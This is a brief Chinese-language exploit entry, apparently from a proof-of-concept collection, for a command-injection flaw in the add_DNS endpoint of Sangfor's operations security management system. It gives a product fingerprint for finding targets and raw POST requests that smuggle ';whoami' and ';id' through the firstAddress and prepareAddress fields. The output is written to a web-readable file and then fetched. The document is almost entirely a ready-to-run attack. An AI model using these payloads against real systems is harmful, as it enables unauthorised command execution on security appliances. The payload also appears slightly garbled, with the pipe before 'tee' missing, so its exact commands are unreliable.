# 深信服运维安全管理系统add_DNS-存在命令执行漏洞

- **系统**：深信服　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`product="SANGFOR-运维安全管理系统"`
- **请求**：`POST /fort/system;help/netConfig/add_DNS HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
firstAddress=;whoami  tee /usr/local/tomcat/webapps/fort/trust/version/hello1.txt;&prepareAddress=8.8.8.8
GET /fort/trust/version/hello1.txt HTTP/1.1
Host:
prepareAddress参数
POST /fort/system;help/netConfig/add_DNS HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-User: ?1
prepareAddress=;id  tee /usr/local/tomcat/webapps/fort/trust/version/hello1.txt;&firstAddress=8.8.8.8
```
- **预期**：200　|　—